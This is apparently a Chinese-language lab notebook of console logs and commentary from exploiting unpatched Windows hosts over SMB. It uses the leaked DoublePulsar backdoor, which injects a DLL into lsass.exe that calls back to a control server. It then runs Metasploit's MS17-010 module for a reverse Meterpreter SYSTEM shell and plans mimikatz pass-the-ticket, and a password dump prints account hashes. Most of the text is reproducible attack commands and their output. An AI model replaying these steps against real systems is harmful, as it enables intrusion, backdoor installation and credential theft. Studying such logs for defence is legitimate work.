[+] Set NetworkTimeout => 60 
[+] Set TargetIp => 172.19.2.16 
[*] Applying Session Parameters 
[!] Enter Prompt Mode :: Doublepulsar 
Module: Doublepulsar 
==================== 
Name              Value 
----              ----- 
NetworkTimeout    60 
TargetIp          172.19.2.16 
TargetPort        445 
OutputFile 
Protocol          SMB 
Architecture      x86 
Function          OutputInstall 
[!] Plugin Variables are NOT Valid 
[?] Prompt For Variable Settings? [Yes] : 
[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use 
-1 for no timeout. 
[?] NetworkTimeout [60] : 
[*]  TargetIp :: Target IP Address 
[?] TargetIp [172.19.2.16] : 
[*]  TargetPort :: Port used by the Double Pulsar back door 
[?] TargetPort [445] : 
[*]  Protocol :: Protocol for the backdoor to speak 
   *0) SMB     Ring 0 SMB (TCP 445) backdoor 
    1) RDP     Ring 0 RDP (TCP 3389) backdoor 
[?] Protocol [0] : 
[*]  Architecture :: Architecture of the target OS 
   *0) x86     x86 32-bits 
    1) x64     x64 64-bits 
[?] Architecture [0] : 
[*]  Function :: Operation for backdoor to perform 
   *0) OutputInstall     Only output the install shellcode to a binary file 
on disk. 
    1) Ping              Test for presence of backdoor 
    2) RunDLL            Use an APC to inject a DLL into a user mode process. 
    3) RunShellcode      Run raw shellcode 
    4) Uninstall         Remove's backdoor from system 
[?] Function [0] : 
[*]  OutputFile :: Full path to the output file 
[?] OutputFile [] : outfile 
[+] Set OutputFile => outfile 
[!] Preparing to Execute Doublepulsar 
[*] Redirection OFF 
[+] Configure Plugin Local Tunnels 
[+] Local Tunnel - local-tunnel-1 
[?] Destination IP [172.19.2.16] : 
[?] Destination Port [445] : 
[+] (TCP) Local 172.19.2.16:445 
[+] Configure Plugin Remote Tunnels 
Module: Doublepulsar 
==================== 
Name              Value 
----              ----- 
NetworkTimeout    60 
TargetIp          172.19.2.16 
TargetPort        445 
OutputFile        outfile 
Protocol          SMB 
Architecture      x86 
Function          OutputInstall 
[?] Execute Plugin? [Yes] : 
[*] Executing Plugin 
[+] Selected Protocol SMB 
[+] Writing Installer to disk 
[*] Deleting old version of OutputFile if it exists 
[*] Shellcode written to OutputFile 
[+] Doublepulsar Succeeded 
fb > use Doublepulsar 
[!] Entering Plugin Context :: Doublepulsar 
[*] Applying Global Variables 
[+] Set NetworkTimeout => 60 
[+] Set TargetIp => 172.19.2.16 
[*] Applying Session Parameters 
[*] Function :: Deconflict 
Index    Session ID           Value 
-----    ----------           ----- 
0        Doublepulsar - 11 
1        Doublepulsar - 15 
2        Doublepulsar - 16 
3        Current Value        RunDLL 
[?] Function [0] : 3 
[+] Using current val for Function
[!] Enter Prompt Mode :: Doublepulsar 
Module: Doublepulsar 
==================== 
Name                  Value 
----                  ----- 
NetworkTimeout        60 
TargetIp              172.19.2.16 
执行成功，但在执行Doublepulsar失败，根据网上资料，应该是Windows 10的SMB修改太多，
导致失败，使用Windows 7应该可以，因为PC_Level3.dll使用手工执行可以成功。
这样就会回连服务器。
安装一个Win7，然后执行。
TargetPort            445 
DllPayload            D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll 
DllOrdinal            1 
ProcessName           lsass.exe 
ProcessCommandLine 
Protocol              SMB 
Architecture          x86 
Function              RunDLL 
[!] plugin variables are valid 
[?] Prompt For Variable Settings? [Yes] : 
[?] Execute Plugin? [Yes] : 
[*] Executing Plugin 
[+] Selected Protocol SMB 
[.] Connecting to target... 
[+] Connected to target, pinging backdoor... 
        [-] Packet MID is zero, backdoor not present 
[!] Plugin failed 
[-] Error: Doublepulsar Failed 
rundll32 PC_Level3.dll,rst32 
use Doublepulsar 
[!] Entering Plugin Context :: Doublepulsar 
[*] Applying Global Variables 
[+] Set NetworkTimeout => 60 
[+] Set TargetIp => 172.19.2.16 
[*] Applying Session Parameters 
[!] Enter Prompt Mode :: Doublepulsar 
Module: Doublepulsar 
==================== 
Name              Value 
----              ----- 
NetworkTimeout    60 
TargetIp          172.19.2.16 
TargetPort        445 
OutputFile 
Protocol          SMB 
Architecture      x86 
Function          OutputInstall 
[!] Plugin Variables are NOT Valid 
[?] Prompt For Variable Settings? [Yes] : 
[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use 
-1 for no timeout. 
[?] NetworkTimeout [60] : 
[*]  TargetIp :: Target IP Address 
[?] TargetIp [172.19.2.16] : 172.19.2.17 
[+] Set TargetIp => 172.19.2.17 
[*]  TargetPort :: Port used by the Double Pulsar back door 
[?] TargetPort [445] : 
[*]  Protocol :: Protocol for the backdoor to speak 
   *0) SMB     Ring 0 SMB (TCP 445) backdoor 
    1) RDP     Ring 0 RDP (TCP 3389) backdoor 
[?] Protocol [0] : 
[*]  Architecture :: Architecture of the target OS 
   *0) x86     x86 32-bits 
    1) x64     x64 64-bits 
[?] Architecture [0] : 
[*]  Function :: Operation for backdoor to perform 
   *0) OutputInstall     Only output the install shellcode to a binary file 
on disk. 
    1) Ping              Test for presence of backdoor 
    2) RunDLL            Use an APC to inject a DLL into a user mode process. 
    3) RunShellcode      Run raw shellcode 
    4) Uninstall         Remove's backdoor from system 
[?] Function [0] : 2 
[+] Set Function => RunDLL 
[*]  DllPayload :: DLL to inject into user mode 
[?] DllPayload [] : D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll 
[+] Set DllPayload => D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll 
[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to 
call 
[?] DllOrdinal [1] : 
[*]  ProcessName :: Name of process to inject into 
[?] ProcessName [lsass.exe] : 
[*]  ProcessCommandLine :: Command line of process to inject into 
[?] ProcessCommandLine [] : 
[!] Preparing to Execute Doublepulsar 
[*] Redirection OFF 
[+] Configure Plugin Local Tunnels 
[+] Local Tunnel - local-tunnel-1 
[?] Destination IP [172.19.2.17] : 
[?] Destination Port [445] : 
[+] (TCP) Local 172.19.2.17:445 
[+] Configure Plugin Remote Tunnels 
Module: Doublepulsar 
==================== 
Name                  Value 
----                  ----- 
NetworkTimeout        60 
TargetIp              172.19.2.17 
TargetPort            445 
DllPayload            D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll 
DllOrdinal            1 
ProcessName           lsass.exe 
ProcessCommandLine 
Protocol              SMB 
Architecture          x86 
Function              RunDLL 
执行成功，等几秒，就会反向连接DSz的PeddleCheap。
在网上有完整的DoublePulsar利用过程。如EternalPulsar  A practical example of a made
up name | HackerNoon
文章利用MSF，生成Payload，然后启动监听程序；接着利用fb里面的Eternblue，
DoublePulsar，将Payload上传到目标机，并执行，就会反向连接到MSF。
这个利用方式跟MSF的利用有点差距，MSF可以直接利用ms17010。
[?] Execute Plugin? [Yes] : 
[*] Executing Plugin 
[+] Selected Protocol SMB 
[.] Connecting to target... 
[+] Connected to target, pinging backdoor... 
        [+] Backdoor returned code: 10 - Success! 
        [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 
0xF2A3472D 
    SMB Connection string is: Windows 7 Professional 7600 
    Target OS is: 7 x86 
    Target SP is: 0 
        [+] Backdoor installed 
        [+] DLL built 
        [.] Sending shellcode to inject DLL 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Backdoor returned code: 10 - Success! 
        [+] Command completed successfully 
[+] Doublepulsar Succeeded 
可以看出msf更加利落干净。
Eternalchampion执行失败。需要进一步研究。
经过在网络搜索，发现msf中已经把这几个smb协议漏洞的利用整合到msf中了，搜索可以得
到。下面我们我们执行一下。
msfconsole 
use exploit/windows/smb/ms17_010_psexec 
set lhost 172.19.2.20 
set RHOSTS 172.19.2.16 
run 
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run 
[*] Started reverse TCP handler on 172.19.2.20:4444 
[*] 172.19.2.16:445 - Target OS: Windows 5.1 
[*] 172.19.2.16:445 - Filling barrel with fish... done 
[*] 172.19.2.16:445 -  
[*] 172.19.2.16:445 -   [*] Preparing dynamite... 
[*] 172.19.2.16:445 -           [*] Trying stick 1 (x86)...Boom! 
[*] 172.19.2.16:445 -   [+] Successfully Leaked Transaction! 
[*] 172.19.2.16:445 -   [+] Successfully caught Fish-in-a-barrel 
[*] 172.19.2.16:445 -  
[*] 172.19.2.16:445 - Reading from CONNECTION struct at: 0x80e2f880 
[*] 172.19.2.16:445 - Built a write-what-where primitive... 
[+] 172.19.2.16:445 - Overwrite complete... SYSTEM session obtained! 
[*] 172.19.2.16:445 - Selecting native target 
[*] 172.19.2.16:445 - Uploading payload... TsulsFkS.exe 
[*] 172.19.2.16:445 - Created \TsulsFkS.exe... 
[+] 172.19.2.16:445 - Service started successfully... 
[*] 172.19.2.16:445 - Deleting \TsulsFkS.exe... 
[*] Sending stage (175174 bytes) to 172.19.2.16 
[*] Meterpreter session 1 opened (172.19.2.20:4444 -> 172.19.2.16:1091 ) at 
2022-04-09 21:56:53 -0400 
(Meterpreter 1)(C:\WINDOWS\system32) > getuid 
Server username: NT AUTHORITY\SYSTEM 
earch ms17-010 
Matching Modules 
================ 
因为前面已经测试了ms17_010_psexec,所以后面只测试ms17_010_eternalblue和
smb_doublepulsar_rce，看看msf的理解。访问MS17010 EternalSynergy / EternalRomance
/ EternalChampion aux+exploit modules · Pull Request #9473 · rapid7/metasploit-
framework (github.com)
这个提交记录说明具体的利用情况。
Payload
这些工具往往需要一个Ticket，但是木有找到获取Ticket的方法。
倒是可以利用mimikatz来获取Ticket。然后使用这里的Payload。
这里的工具一类是直接下发负载，一类是提权工具。
下面利用DSz的工具进行hashdump，然后利用token进行ptt等NT凭据利用操作。
   #  Name                                      Disclosure Date  Rank     
Check  Description 
   -  ----                                      ---------------  ----     ---
--  ----------- 
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes   
MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes   
MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows 
Code Execution 
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No    
MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows 
Command Execution 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No    
MS17-010 SMB RCE Detection 
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes   
SMB DOUBLEPULSAR Remote Code Execution 
Interact with a module by name or index. For example info 4, use 4 or use 
exploit/windows/smb/smb_doublepulsar_rce 
passworddump  
[03:30:10] ID: 542 'passworddump' started [target: z0.0.0.11] 
       User : Administrator 
        Rid : 500 
    Expired : false 
  Exception : false 
Lanman Hash : daa141f3639de015aad3b435b51404ee 
    Nt Hash : ad70819c5bc807280974d80f45982011 
------------------------------------------------------------------------ 
       User : ASPNET 
        Rid : 1006 
    Expired : false 
  Exception : false 
Lanman Hash : 28f84b2ddea413b7530046f0289088af 
    Nt Hash : fc4dcca97e3b926301f804e94dcd4338 
------------------------------------------------------------------------ 
       User : Guest 
        Rid : 501 
    Expired : false 
  Exception : false 
Lanman Hash : aad3b435b51404eeaad3b435b51404ee (Empty string) 